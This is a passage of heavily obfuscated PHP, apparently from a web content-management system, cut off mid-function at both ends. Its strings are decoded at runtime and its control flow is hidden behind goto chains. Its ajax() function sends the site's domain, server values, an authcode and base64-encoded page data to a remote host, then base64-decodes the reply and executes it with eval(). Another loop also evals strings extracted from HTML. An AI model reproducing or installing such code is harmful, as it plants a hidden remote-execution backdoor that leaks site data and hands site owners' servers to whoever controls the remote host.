    $I4ucVvP1 = $GLOBALS[AvLDZrJ][0x18];
    I4ux47:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    unset($I4utIAA);
    $t = $H_data[$I4ueFvP0];
    I4ux43:
    unset($I4ucVvP1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4a;
    goto I4uldMhx4a;
    I4ueWjgx4a:
    $I4ucVvP1 =& $GLOBALS[AvLDZrJ][0x11];
    goto I4ux49;
    I4uldMhx4a:
    $I4ucVvP1 = $GLOBALS[AvLDZrJ][0x11];
    I4ux49:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
    unset($I4ucVvP4);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4c;
    goto I4uldMhx4c;
    I4ueWjgx4c:
    $I4ucVvP4 =& $GLOBALS[AvLDZrJ][0x12];
    goto I4ux4b;
    I4uldMhx4c:
    $I4ucVvP4 = $GLOBALS[AvLDZrJ][0x12];
    I4ux4b:
    $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP4));
    unset($I4ucVvP7);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4e;
    goto I4uldMhx4e;
    I4ueWjgx4e:
    $I4ucVvP7 =& $GLOBALS[AvLDZrJ][07];
    goto I4ux4d;
    I4uldMhx4e:
    $I4ucVvP7 = $GLOBALS[AvLDZrJ][07];
    I4ux4d:
    $I4ueFvP6 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP7));
    $I4ueFvP9 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x9}));
    $I4ueFvP10 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{11}));
    unset($I4ucVvP12);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4g;
    goto I4uldMhx4g;
    I4ueWjgx4g:
    $I4ucVvP12 =& $GLOBALS[AvLDZrJ][0x19];
    goto I4ux4f;
    I4uldMhx4g:
    $I4ucVvP12 = $GLOBALS[AvLDZrJ][0x19];
    I4ux4f:
    $I4ueFvP11 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP12));
    unset($I4ucVvP15);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4i;
    goto I4uldMhx4i;
    I4ueWjgx4i:
    $I4ucVvP15 =& $GLOBALS[AvLDZrJ][14];
    goto I4ux4h;
    I4uldMhx4i:
    $I4ucVvP15 = $GLOBALS[AvLDZrJ][14];
    I4ux4h:
    $I4ueFvP14 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP15));
    $I4ueFvP17 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{16}));
    $I4ueFvP18 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x1A}));
    $I4ueFvP19 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{27}));
    unset($I4ucVvP21);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4k;
    goto I4uldMhx4k;
    I4ueWjgx4k:
    $I4ucVvP21 =& $GLOBALS[AvLDZrJ][034];
    goto I4ux4j;
    I4uldMhx4k:
    $I4ucVvP21 = $GLOBALS[AvLDZrJ][034];
    I4ux4j:
    $I4ueFvP20 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP21));
    $I4ueFvPvP23 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{22}));
    unset($I4ucVvP25);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4m;
    goto I4uldMhx4m;
    I4ueWjgx4m:
    $I4ucVvP25 =& $GLOBALS[AvLDZrJ][035];
    goto I4ux4l;
    I4uldMhx4m:
    $I4ucVvP25 = $GLOBALS[AvLDZrJ][035];
    I4ux4l:
    $I4ueFvP24 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP25));
    $I4uzA27 = array();
    $I4uzA27[$I4ueFvP0] = $html;
    $I4uzA27[$I4ueFvP3] = $H_data;
    $I4uzA27[$I4ueFvP6] = $N_count;
    $I4uzA27[$I4ueFvP9] = $P_count;
    $I4uzA27[$I4ueFvP10] = $M_count;
    $I4uzA27[$I4ueFvP11] = $S_count;
    $I4uzA27[$I4ueFvP14] = $L_count;
    $I4uzA27[$I4ueFvP17] = $L_sum;
    $I4uzA27[$I4ueFvP18] = $type;
    $I4uzA27[$I4ueFvP19] = $md5;
    $I4uzA27[$I4ueFvP20] = $_SERVER[$I4ueFvPvP23];
    $I4uzA27[$I4ueFvP24] = $t;
    unset($I4utIAA);
    $data = $I4uzA27;
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x1E}));
    $I4ueFvPvPvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{22}));
    $I4ueFvPvP2 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x1F}));
    unset($I4ucVvP4);
    if (is_array($_SERVER)) goto I4ueWjgx4t;
    goto I4uldMhx4t;
    I4ueWjgx4t:
    $I4ucVvP4 =& $_SERVER[$I4ueFvPvPvP1];
    goto I4ux4s;
    I4uldMhx4t:
    $I4ucVvP4 = $_SERVER[$I4ueFvPvPvP1];
    I4ux4s:
    $I4ueFvP3 = call_user_func_array("splitx", array(&$I4ucVvP4, &$I4ueFvPvP2, 0));
    $I4uvPAA = $I4ueFvP0 . $I4ueFvP3;
    $I4uvPAB = $I4uvPAA . $t;
    unset($I4ucVvP6);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4r;
    goto I4uldMhx4r;
    I4ueWjgx4r:
    $I4ucVvP6 =& $GLOBALS[AvLDZrJ][32];
    goto I4ux4q;
    I4uldMhx4r:
    $I4ucVvP6 = $GLOBALS[AvLDZrJ][32];
    I4ux4q:
    $I4ueFvP5 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP6));
    $I4uvPAC = $I4uvPAB . $I4ueFvP5;
    $I4uvPAD = $I4uvPAC . $type;
    unset($I4ucVvP8);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4p;
    goto I4uldMhx4p;
    I4ueWjgx4p:
    $I4ucVvP8 =& $GLOBALS[AvLDZrJ][041];
    goto I4ux4o;
    I4uldMhx4p:
    $I4ucVvP8 = $GLOBALS[AvLDZrJ][041];
    I4ux4o:
    $I4ueFvP7 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP8));
    $I4uvPAE = $I4uvPAD . $I4ueFvP7;
    $I4ueF12 = call_user_func_array("is_file", array(&$I4uvPAE));
    if ($I4ueF12) goto I4ueWjgx4u;
    goto I4uldMhx4u;
    I4ueWjgx4u:
    $I4ueFvPvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x1E}));
    $I4ueFvPvPvPvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{22}));
    $I4ueFvPvPvP2 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x1F}));
    unset($I4ucVvPvP4);
    if (is_array($_SERVER)) goto I4ueWjgx52;
    goto I4uldMhx52;
    I4ueWjgx52:
    $I4ucVvPvP4 =& $_SERVER[$I4ueFvPvPvPvP1];
    goto I4ux51;
    I4uldMhx52:
    $I4ucVvPvP4 = $_SERVER[$I4ueFvPvPvPvP1];
    I4ux51:
    $I4ueFvPvP3 = call_user_func_array("splitx", array(&$I4ucVvPvP4, &$I4ueFvPvPvP2, 0));
    $I4uvPvPAA = $I4ueFvPvP0 . $I4ueFvPvP3;
    $I4uvPvPAB = $I4uvPvPAA . $t;
    unset($I4ucVvPvP6);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5z;
    goto I4uldMhx5z;
    I4ueWjgx5z:
    $I4ucVvPvP6 =& $GLOBALS[AvLDZrJ][32];
    goto I4ux4y;
    I4uldMhx5z:
    $I4ucVvPvP6 = $GLOBALS[AvLDZrJ][32];
    I4ux4y:
    $I4ueFvPvP5 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvPvP6));
    $I4uvPvPAC = $I4uvPvPAB . $I4ueFvPvP5;
    $I4uvPvPAD = $I4uvPvPAC . $type;
    unset($I4ucVvPvP8);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx4x;
    goto I4uldMhx4x;
    I4ueWjgx4x:
    $I4ucVvPvP8 =& $GLOBALS[AvLDZrJ][041];
    goto I4ux4w;
    I4uldMhx4x:
    $I4ucVvPvP8 = $GLOBALS[AvLDZrJ][041];
    I4ux4w:
    $I4ueFvPvP7 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvPvP8));
    $I4uvPvPAE = $I4uvPvPAD . $I4ueFvPvP7;
    $I4ueFvP12 = call_user_func_array("file_get_contents", array(&$I4uvPvPAE));
    $I4ueF13 = call_user_func_array("substr", array(&$I4ueFvP12, 0, 32));
    $I4uAF = $I4ueF13 != $md5;
    if ($I4uAF) goto I4ueWjgx53;
    goto I4uldMhx53;
    I4ueWjgx53:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{34}));
    $I4ueFvPvP1 = call_user_func_array("json_encode", array(&$data));
    $I4ueFvP2 = call_user_func_array("base64_encode", array(&$I4ueFvPvP1));
    $I4ueF3 = call_user_func_array("ajax", array(&$I4ueFvP0, &$I4ueFvP2));
    goto I4ux4v;
    I4uldMhx53:I4ux4v:
    goto I4ux4n;
    I4uldMhx4u:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{34}));
    $I4ueFvPvP1 = call_user_func_array("json_encode", array(&$data));
    $I4ueFvP2 = call_user_func_array("base64_encode", array(&$I4ueFvPvP1));
    $I4ueF3 = call_user_func_array("ajax", array(&$I4ueFvP0, &$I4ueFvP2));
    I4ux4n:
    $I4ueFvPvPvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x1E}));
    $I4ueFvPvPvPvPvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{22}));
    $I4ueFvPvPvPvP2 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x1F}));
    unset($I4ucVvPvPvP4);
    if (is_array($_SERVER)) goto I4ueWjgx59;
    goto I4uldMhx59;
    I4ueWjgx59:
    $I4ucVvPvPvP4 =& $_SERVER[$I4ueFvPvPvPvPvP1];
    goto I4ux58;
    I4uldMhx59:
    $I4ucVvPvPvP4 = $_SERVER[$I4ueFvPvPvPvPvP1];
    I4ux58:
    $I4ueFvPvPvP3 = call_user_func_array("splitx", array(&$I4ucVvPvPvP4, &$I4ueFvPvPvPvP2, 0));
    $I4uvPvPvPAA = $I4ueFvPvPvP0 . $I4ueFvPvPvP3;
    $I4uvPvPvPAB = $I4uvPvPvPAA . $t;
    unset($I4ucVvPvPvP6);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx57;
    goto I4uldMhx57;
    I4ueWjgx57:
    $I4ucVvPvPvP6 =& $GLOBALS[AvLDZrJ][32];
    goto I4ux56;
    I4uldMhx57:
    $I4ucVvPvPvP6 = $GLOBALS[AvLDZrJ][32];
    I4ux56:
    $I4ueFvPvPvP5 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvPvPvP6));
    $I4uvPvPvPAC = $I4uvPvPvPAB . $I4ueFvPvPvP5;
    $I4uvPvPvPAD = $I4uvPvPvPAC . $type;
    unset($I4ucVvPvPvP8);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx55;
    goto I4uldMhx55;
    I4ueWjgx55:
    $I4ucVvPvPvP8 =& $GLOBALS[AvLDZrJ][041];
    goto I4ux54;
    I4uldMhx55:
    $I4ucVvPvPvP8 = $GLOBALS[AvLDZrJ][041];
    I4ux54:
    $I4ueFvPvPvP7 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvPvPvP8));
    $I4uvPvPvPAE = $I4uvPvPvPAD . $I4ueFvPvPvP7;
    $I4ueFvPvP12 = call_user_func_array("file_get_contents", array(&$I4uvPvPvPAE));
    $I4ueFvP13 = call_user_func_array("substr", array(&$I4ueFvPvP12, 32));
    $I4ueF14 = call_user_func_array("base64_decode", array(&$I4ueFvP13));
    unset($I4utIAF);
    $html = $I4ueF14;
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{35}));
    $I4ueF1 = call_user_func_array("preg_match_all", array(&$I4ueFvP0, &$html, &$arr));
    foreach ($arr[0] as $value) {
        $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{044}));
        unset($I4ucVvP2);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5b;
        goto I4uldMhx5b;
        I4ueWjgx5b:
        $I4ucVvP2 =& $GLOBALS[AvLDZrJ][0x25];
        goto I4ux5a;
        I4uldMhx5b:
        $I4ucVvP2 = $GLOBALS[AvLDZrJ][0x25];
        I4ux5a:
        $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP2));
        $I4ueF4 = call_user_func_array("str_replace", array(&$I4ueFvP0, &$I4ueFvP1, &$value));
        unset($I4utIAA);
        $v = $I4ueF4;
        unset($I4ucVvP1);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5d;
        goto I4uldMhx5d;
        I4ueWjgx5d:
        $I4ucVvP1 =& $GLOBALS[AvLDZrJ][0x26];
        goto I4ux5c;
        I4uldMhx5d:
        $I4ucVvP1 = $GLOBALS[AvLDZrJ][0x26];
        I4ux5c:
        $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
        unset($I4ucVvP4);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5f;
        goto I4uldMhx5f;
        I4ueWjgx5f:
        $I4ucVvP4 =& $GLOBALS[AvLDZrJ][0x25];
        goto I4ux5e;
        I4uldMhx5f:
        $I4ucVvP4 = $GLOBALS[AvLDZrJ][0x25];
        I4ux5e:
        $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP4));
        $I4ueF6 = call_user_func_array("str_replace", array(&$I4ueFvP0, &$I4ueFvP3, &$v));
        unset($I4utIAA);
        $v = $I4ueF6;
        unset($I4ucVvP1);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5h;
        goto I4uldMhx5h;
        I4ueWjgx5h:
        $I4ucVvP1 =& $GLOBALS[AvLDZrJ][39];
        goto I4ux5g;
        I4uldMhx5h:
        $I4ucVvP1 = $GLOBALS[AvLDZrJ][39];
        I4ux5g:
        $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
        unset($I4ucVvP4);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5j;
        goto I4uldMhx5j;
        I4ueWjgx5j:
        $I4ucVvP4 =& $GLOBALS[AvLDZrJ][050];
        goto I4ux5i;
        I4uldMhx5j:
        $I4ucVvP4 = $GLOBALS[AvLDZrJ][050];
        I4ux5i:
        $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP4));
        $I4ueF6 = call_user_func_array("str_replace", array(&$I4ueFvP0, &$I4ueFvP3, &$v));
        unset($I4utIAA);
        $v = $I4ueF6;
        $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{051}));
        unset($I4ucVvP2);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5l;
        goto I4uldMhx5l;
        I4ueWjgx5l:
        $I4ucVvP2 =& $GLOBALS[AvLDZrJ][052];
        goto I4ux5k;
        I4uldMhx5l:
        $I4ucVvP2 = $GLOBALS[AvLDZrJ][052];
        I4ux5k:
        $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP2));
        $I4ueF4 = call_user_func_array("str_replace", array(&$I4ueFvP0, &$I4ueFvP1, &$v));
        unset($I4utIAA);
        $v = $I4ueF4;
        unset($I4ucVvP1);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5n;
        goto I4uldMhx5n;
        I4ueWjgx5n:
        $I4ucVvP1 =& $GLOBALS[AvLDZrJ][053];
        goto I4ux5m;
        I4uldMhx5n:
        $I4ucVvP1 = $GLOBALS[AvLDZrJ][053];
        I4ux5m:
        $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
        $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{44}));
        $I4ueF4 = call_user_func_array("str_replace", array(&$I4ueFvP0, &$I4ueFvP3, &$v));
        unset($I4utIAA);
        $v = $I4ueF4;
        unset($I4ucVvP1);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5p;
        goto I4uldMhx5p;
        I4ueWjgx5p:
        $I4ucVvP1 =& $GLOBALS[AvLDZrJ][055];
        goto I4ux5o;
        I4uldMhx5p:
        $I4ucVvP1 = $GLOBALS[AvLDZrJ][055];
        I4ux5o:
        $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucVvP1));
        $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{46}));
        $I4ueF4 = call_user_func_array("str_replace", array(&$I4ueFvP0, &$I4ueFvP3, &$v));
        unset($I4utIAA);
        $v = $I4ueF4;
        eval($v);
        $I4ueF0 = call_user_func_array("str_replace", array(&$value, &$api, &$html));
        unset($I4utIAA);
        $html = $I4ueF0;
        unset($I4ucV1);
        if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5r;
        goto I4uldMhx5r;
        I4ueWjgx5r:
        $I4ucV1 =& $GLOBALS[AvLDZrJ][0x25];
        goto I4ux5q;
        I4uldMhx5r:
        $I4ucV1 = $GLOBALS[AvLDZrJ][0x25];
        I4ux5q:
        $I4ueF0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucV1));
        unset($I4utIAA);
        $api = $I4ueF0;
    }
    $I4ueF0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{47}));
    $I4uAA = $html . $I4ueF0;
    $I4ueFvPvP1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x1A}));
    unset($I4ucV3);
    if (is_array($_GET)) goto I4ueWjgx5x;
    goto I4uldMhx5x;
    I4ueWjgx5x:
    $I4ucV3 =& $_GET[$I4ueFvPvP1];
    goto I4ux5w;
    I4uldMhx5x:
    $I4ucV3 = $_GET[$I4ueFvPvP1];
    I4ux5w:
    $I4ueF2 = call_user_func_array("t", array(&$I4ucV3));
    $I4uAB = $I4uAA . $I4ueF2;
    $I4ueF4 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x30}));
    $I4uAC = $I4uAB . $I4ueF4;
    $I4ueFvPvP5 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{0x31}));
    unset($I4ucV7);
    if (is_array($_GET)) goto I4ueWjgx5v;
    goto I4uldMhx5v;
    I4ueWjgx5v:
    $I4ucV7 =& $_GET[$I4ueFvPvP5];
    goto I4ux5u;
    I4uldMhx5v:
    $I4ucV7 = $_GET[$I4ueFvPvP5];
    I4ux5u:
    $I4ueF6 = call_user_func_array("intval", array(&$I4ucV7));
    $I4uAD = $I4uAC . $I4ueF6;
    unset($I4ucV9);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx5t;
    goto I4uldMhx5t;
    I4ueWjgx5t:
    $I4ucV9 =& $GLOBALS[AvLDZrJ][50];
    goto I4ux5s;
    I4uldMhx5t:
    $I4ucV9 = $GLOBALS[AvLDZrJ][50];
    I4ux5s:
    $I4ueF8 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucV9));
    $I4uAE = $I4uAD . $I4ueF8;
    unset($I4utIAF);
    $html = $I4uAE;
    $I4ueF0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{51}));
    $I4uAA = $type == $I4ueF0;
    $I4uAC = (bool)$I4uAA;
    $I4uAG = !$I4uAC;
    if ($I4uAG) goto I4ueWjgx65;
    goto I4uldMhx65;
    I4ueWjgx65:
    $I4ueF1 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, $GLOBALS[AvLDZrJ]{064}));
    $I4uAB = $type == $I4ueF1;
    $I4uAC = (bool)$I4uAB;
    goto I4ux64;
    I4uldMhx65:I4ux64:
    $I4uAE = (bool)$I4uAC;
    $I4uAF = !$I4uAE;
    if ($I4uAF) goto I4ueWjgx63;
    goto I4uldMhx63;
    I4ueWjgx63:
    unset($I4ucV3);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx61;
    goto I4uldMhx61;
    I4ueWjgx61:
    $I4ucV3 =& $GLOBALS[AvLDZrJ][065];
    goto I4ux6z;
    I4uldMhx61:
    $I4ucV3 = $GLOBALS[AvLDZrJ][065];
    I4ux6z:
    $I4ueF2 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucV3));
    $I4uAD = $type == $I4ueF2;
    $I4uAE = (bool)$I4uAD;
    goto I4ux62;
    I4uldMhx63:I4ux62:
    if ($I4uAE) goto I4ueWjgx66;
    goto I4uldMhx66;
    I4ueWjgx66:
    unset($I4ucV1);
    if (is_array($GLOBALS[AvLDZrJ])) goto I4ueWjgx68;
    goto I4uldMhx68;
    I4ueWjgx68:
    $I4ucV1 =& $GLOBALS[AvLDZrJ][54];
    goto I4ux67;
    I4uldMhx68:
    $I4ucV1 = $GLOBALS[AvLDZrJ][54];
    I4ux67:
    $I4ueF0 = call_user_func_array("pack", array($GLOBALS[AvLDZrJ]{0x0}, &$I4ucV1));
    $I4uAA = $html . $I4ueF0;
    unset($I4utIAB);
    $html = $I4uAA;
    goto I4ux5y;
    I4uldMhx66:I4ux5y:
    return $html;
}

function ajax($action, $data = "")
{
    global $conn, $C_authcode, $C_fdomain, $C_fzon, $from;
    unset($I4ucV1);
    if (is_array($GLOBALS[rCsMKkv])) goto I4ueWjgx6j;
    goto I4uldMhx6j;
    I4ueWjgx6j:
    $I4ucV1 =& $GLOBALS[rCsMKkv][01];
    goto I4ux6i;
    I4uldMhx6j:
    $I4ucV1 = $GLOBALS[rCsMKkv][01];
    I4ux6i:
    $I4ueF0 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, &$I4ucV1));
    $I4uAA = $C_fdomain != $I4ueF0;
    $I4uAC = (bool)$I4uAA;
    if ($I4uAC) goto I4ueWjgx6h;
    goto I4uldMhx6h;
    I4ueWjgx6h:
    $I4uAB = $C_fzon == 1;
    $I4uAC = (bool)$I4uAB;
    goto I4ux6g;
    I4uldMhx6h:I4ux6g:
    $I4uAE = (bool)$I4uAC;
    if ($I4uAE) goto I4ueWjgx6f;
    goto I4uldMhx6f;
    I4ueWjgx6f:
    $I4ueF2 = call_user_func_array("www", array(&$C_fdomain));
    unset($I4ucVvPvP4);
    if (is_array($GLOBALS[rCsMKkv])) goto I4ueWjgx6b;
    goto I4uldMhx6b;
    I4ueWjgx6b:
    $I4ucVvPvP4 =& $GLOBALS[rCsMKkv][0x2];
    goto I4ux6a;
    I4uldMhx6b:
    $I4ucVvPvP4 = $GLOBALS[rCsMKkv][0x2];
    I4ux6a:
    $I4ueFvPvP3 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, &$I4ucVvPvP4));
    unset($I4ucV7);
    if (is_array($_SERVER)) goto I4ueWjgx6d;
    goto I4uldMhx6d;
    I4ueWjgx6d:
    $I4ucV7 =& $_SERVER[$I4ueFvPvP3];
    goto I4ux6c;
    I4uldMhx6d:
    $I4ucV7 = $_SERVER[$I4ueFvPvP3];
    I4ux6c:
    $I4ueF6 = call_user_func_array("www", array(&$I4ucV7));
    $I4uAD = $I4ueF2 != $I4ueF6;
    $I4uAE = (bool)$I4uAD;
    goto I4ux6e;
    I4uldMhx6f:I4ux6e:
    if ($I4uAE) goto I4ueWjgx6k;
    goto I4uldMhx6k;
    I4ueWjgx6k:
    unset($I4utIAA);
    $domain = $C_fdomain;
    goto I4ux69;
    I4uldMhx6k:
    unset($I4ucVvP1);
    if (is_array($GLOBALS[rCsMKkv])) goto I4ueWjgx6m;
    goto I4uldMhx6m;
    I4ueWjgx6m:
    $I4ucVvP1 =& $GLOBALS[rCsMKkv][0x2];
    goto I4ux6l;
    I4uldMhx6m:
    $I4ucVvP1 = $GLOBALS[rCsMKkv][0x2];
    I4ux6l:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, &$I4ucVvP1));
    unset($I4utIAA);
    $domain = $_SERVER[$I4ueFvP0];
    I4ux69:
    unset($I4ucVvP1);
    if (is_array($GLOBALS[rCsMKkv])) goto I4ueWjgx6o;
    goto I4uldMhx6o;
    I4ueWjgx6o:
    $I4ucVvP1 =& $GLOBALS[rCsMKkv][0x3];
    goto I4ux6n;
    I4uldMhx6o:
    $I4ucVvP1 = $GLOBALS[rCsMKkv][0x3];
    I4ux6n:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, &$I4ucVvP1));
    $I4uvPAA = $from . $I4ueFvP0;
    $I4uvPAB = $I4uvPAA . $action;
    $I4ueFvP3 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, $GLOBALS[rCsMKkv]{0x4}));
    $I4uvPAC = $I4ueFvP3 . $domain;
    $I4ueFvP4 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, $GLOBALS[rCsMKkv]{05}));
    $I4uvPAD = $I4uvPAC . $I4ueFvP4;
    $I4ueFvPvP5 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, $GLOBALS[rCsMKkv]{0x6}));
    $I4uvPAE = $I4uvPAD . $_SERVER[$I4ueFvPvP5];
    $I4ueFvP6 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, $GLOBALS[rCsMKkv]{7}));
    $I4uvPAF = $I4uvPAE . $I4ueFvP6;
    $I4uvPAG = $I4uvPAF . $C_authcode;
    $I4ueFvP7 = call_user_func_array("pack", array($GLOBALS[rCsMKkv]{0}, $GLOBALS[rCsMKkv]{010}));
    $I4uvPAH = $I4uvPAG . $I4ueFvP7;
    $I4ueFvP8 = call_user_func_array("urlencode", array(&$data));
    $I4uvPAI = $I4uvPAH . $I4ueFvP8;
    $I4ueF9 = call_user_func_array("getbody", array(&$I4uvPAB, &$I4uvPAI));
    unset($I4utIAJ);
    $info = $I4ueF9;
    $I4ueF0 = call_user_func_array("base64_decode", array(&$info));
    eval($I4ueF0);
}

function checkauth()
{
    global $conn, $C_authcode, $C_fdomain, $C_fzon, $from;
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, $GLOBALS[FlvdiKQ]{01}));
    $I4ueF1 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, $GLOBALS[FlvdiKQ]{01}));
    $I4uAA = $_SESSION[$I4ueFvP0] == $I4ueF1;
    if ($I4uAA) goto I4ueWjgx6q;
    goto I4uldMhx6q;
    I4ueWjgx6q:
    return true;
    goto I4ux6p;
    I4uldMhx6q:
    $I4ueF0 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, $GLOBALS[FlvdiKQ]{2}));
    $I4uAA = $C_fdomain != $I4ueF0;
    $I4uAC = (bool)$I4uAA;
    if ($I4uAC) goto I4ueWjgx7z;
    goto I4uldMhx7z;
    I4ueWjgx7z:
    $I4uAB = $C_fzon == 1;
    $I4uAC = (bool)$I4uAB;
    goto I4ux6y;
    I4uldMhx7z:I4ux6y:
    $I4uAE = (bool)$I4uAC;
    if ($I4uAE) goto I4ueWjgx6x;
    goto I4uldMhx6x;
    I4ueWjgx6x:
    $I4ueF1 = call_user_func_array("www", array(&$C_fdomain));
    unset($I4ucVvPvP3);
    if (is_array($GLOBALS[FlvdiKQ])) goto I4ueWjgx6t;
    goto I4uldMhx6t;
    I4ueWjgx6t:
